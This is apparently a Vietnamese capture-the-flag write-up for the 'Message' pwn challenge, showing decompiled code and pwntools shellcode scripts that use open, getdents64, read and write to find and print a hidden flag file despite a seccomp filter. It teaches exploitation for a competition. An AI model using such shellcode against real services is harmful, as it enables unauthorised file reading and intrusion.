# Message

## Ida

```c 
int __cdecl main(int argc, const char **argv, const char **envp)
{
  void *v4; // [rsp+0h] [rbp-10h]
  void *v5; // [rsp+8h] [rbp-8h]

  v4 = malloc(0x150uLL);
  v5 = mmap(0LL, 0x1000uLL, 7, 34, -1, 0LL);
  setup();
  seccomp_setup();
  if ( v5 != (void *)-1LL && v4 )
  {
    puts("Anything you want to tell me? ");
    read(0, v4, 0x150uLL);
    memcpy(v5, v4, 0x1000uLL);
    ((void (*)(void))v5)();
    free(v4);
    munmap(v5, 0x1000uLL);
    return 0;
  }
  else
  {
    perror("Allocation failed");
    return 1;
  }
}
```

## Analysis and Exploit 
- đây đơn giản là 1 chall shellcode bình thường
- khoan đã nó có hàm seccomp, ta dùng seccomp tool kiểm tra xem sao 

![image](https://github.com/gookoosss/CTF/assets/128712571/97ecc24e-6777-452e-b095-6e69c5097052)


- chall chỉ cho phép ta dùng 4 syscall read, write, open, getdens64
- khác với mấy chall khác thì chall này ko cho ta địa chỉ chứa flag => suy ra ta phải tự tìm địa chỉ chứa flag
- syscall getdens64 khá lạ nên ta sẽ cùng tìm hiểu 

![image](https://github.com/gookoosss/CTF/assets/128712571/6fbb29a5-8f74-43ca-b351-dac257a44702)


- à getdens64 dùng để đọc các file trong thư mục, hmm nếu vậy ta có thể dễ hình dung thì nó tương tự như lệnh ls 

![image](https://github.com/gookoosss/CTF/assets/128712571/0d5bfcac-c337-4ffa-859d-bd488aa2e0d5)



- sau khi tham khảo wu thì mình cũng biết cách để sử dụng syscall getdens64 kết hợp với open, write để tìm ra địa chỉ file chứa flag

```python 
from pwn import *
import os

context.arch = 'amd64'

p = remote('ctf.tcp1p.com', 8008)
payload = asm(shellcraft.open('./', os.O_DIRECTORY))
payload += asm(shellcraft.getdents64(3, 'rsp', 0x100))
payload += asm(shellcraft.write(1, 'rsp', 0x100))
p.send(payload)
p.interactive()
```

**theo mình hiểu đơn giản thì:**
- Sử dụng shellcraft.open để mở thư mục hiện tại (./) dưới dạng một file descriptor và thư mục bằng cách sử dụng O_DIRECTORY.
- shellcraft.getdents64 để lấy các mục trong thư mục từ file descriptor và lưu kết quả vào con trỏ stack (rsp) với kích thước buffer là 0x100 byte.
- shellcraft.write để ghi các mục thư mục đã lấy ra  đầu từ con trỏ stack (rsp) với kích thước 0x100 byte.

![image](https://github.com/gookoosss/CTF/assets/128712571/1a6e9d05-9ebd-4581-be0e-aca8d759bef8)


- soi kĩ thì thấy có file tên flag-3462d01f8e1bcc0d8318c4ec420dd482a82bd8b650d1e43bfc4671cf9856ee90.txt, khả năng cao file này chứa flag
- kết hợp 3 syscall open, read, write để thử lấy flag 

```python 
payload = asm(shellcraft.open('flag-3462d01f8e1bcc0d8318c4ec420dd482a82bd8b650d1e43bfc4671cf9856ee90.txt'))
payload += asm(shellcraft.read(3, 'rsp', 0x100))
payload += asm(shellcraft.write(1, 'rsp', 0x100))

r.send(payload)
```
- và cuối cùng ta cũng lấy được flag 

![image](https://github.com/gookoosss/CTF/assets/128712571/084a6ff0-09cb-40fc-a384-9408ab8d20c5)



## script

```python 
from pwn import *
import os

context.arch = 'amd64'


r = remote('ctf.tcp1p.com', 8008)
# payload = asm(shellcraft.open('./', os.O_DIRECTORY))
# payload += asm(shellcraft.getdents64(3, 'rsp', 0x100))
# payload += asm(shellcraft.write(1, 'rsp', 0x100))

payload = asm(shellcraft.open('flag-3462d01f8e1bcc0d8318c4ec420dd482a82bd8b650d1e43bfc4671cf9856ee90.txt'))
payload += asm(shellcraft.read(3, 'rsp', 0x100))
payload += asm(shellcraft.write(1, 'rsp', 0x100))

r.send(payload)
r.interactive()

#TCP1P{I_pr3fer_to_SAY_ORGW_rather_th4n_OGRW_d0nt_y0u_th1nk_so??}
```

## Flag

TCP1P{I_pr3fer_to_SAY_ORGW_rather_th4n_OGRW_d0nt_y0u_th1nk_so??}


